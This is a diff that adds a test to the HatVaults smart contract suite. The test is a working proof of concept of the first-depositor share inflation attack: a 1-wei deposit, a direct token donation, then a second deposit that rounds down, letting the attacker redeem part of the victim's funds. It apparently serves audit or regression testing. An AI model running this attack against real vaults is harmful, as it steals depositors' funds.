@@ -289,6 +289,56 @@ contract("HatVaults", (accounts) => {
       assertVMException(ex, "CannotSetToPerviousRewardController");
     }
   });
+  
+  it("First depositor can partially steal deposits and DoS vault", async () => {
+    await setUpGlobalVars(
+      accounts,
+      (await web3.eth.getBlock("latest")).number,
+      8000,
+      [7000, 2500, 500],
+      [1000, 500],
+      10000,
+      0,
+      100,
+      false,
+      2500000,
+      60 * 60 * 24 * 3
+    );
+    currentBlockNumber = (await web3.eth.getBlock("latest")).number;
+    var staker = accounts[1];
+    var staker2 = accounts[2];
+    await stakingToken.approve(vault.address, web3.utils.toWei("1", "ether"), {
+      from: staker,
+    });
+    await stakingToken.approve(vault.address, web3.utils.toWei("1.5", "ether"), {
+      from: staker2,
+    });
+    await stakingToken.mint(staker, "1");
+
+    //Stake minimum amount
+    let tx = await vault.deposit("1", staker, { from: staker });
+
+    //Makes sure all values are set properly
+    assert.equal((await vault.balanceOf(staker)).toString(), "1");
+    assert.equal((await vault.totalSupply()).toString(), "1");
+    assert.equal((await stakingToken.balanceOf(vault.address)).toString(), "1");
+
+    //Now we transfer a large amount of tokens to the vault.
+    await stakingToken.mint(staker, web3.utils.toWei('1', 'ether'));
+    await stakingToken.transfer(vault.address, web3.utils.toWei('1', 'ether'), {
+      from: staker,
+    });
+
+    await stakingToken.mint(staker2, web3.utils.toWei('1.5', 'ether'));
+
+    //Number of shares have rounded down
+    await vault.deposit(web3.utils.toWei('1.5', 'ether'), staker, { from: staker2 });
+    assert.equal((await vault.totalSupply()).toString(), "2");
+
+    //If able to withdraw, the malicious actor will withdraw all their assets + some extra due to rounding errors.
+    await safeRedeem(vault, "1", staker);
+    assert.equal(web3.utils.toWei('1.25', 'ether'), (await stakingToken.balanceOf(staker)).toString());
+  });
 
   it("Emergency withdraw", async () => {
     await setUpGlobalVars(accounts);
